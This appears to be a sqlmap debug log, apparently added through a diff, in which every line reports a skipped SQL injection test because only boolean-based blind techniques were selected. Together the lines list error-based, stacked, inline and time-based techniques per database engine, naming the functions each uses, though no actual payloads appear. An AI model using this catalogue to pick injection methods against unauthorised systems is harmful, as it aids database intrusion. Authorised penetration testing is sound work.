+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'InterSystems Cache AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'InterSystems Cache OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'CUBRID AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'CUBRID OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Virtuoso AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Virtuoso OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (getSetting)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'H2 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Spanner AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Spanner OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite >= 3.9 OR error-based - WHERE or HAVING clause (JSON path)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Presto AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PARSE_DATA_SIZE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Presto OR error-based - WHERE or HAVING clause (PARSE_DATA_SIZE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server error-based - Stacking (RAISERROR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse inline queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (no semicolon)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - no semicolon)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND time-based blind' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR time-based blind' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'CUBRID AND time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'CUBRID OR time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse AND time-based blind (sleepEachRow)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse OR time-based blind (sleepEachRow)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_SESSION.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_SESSION.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
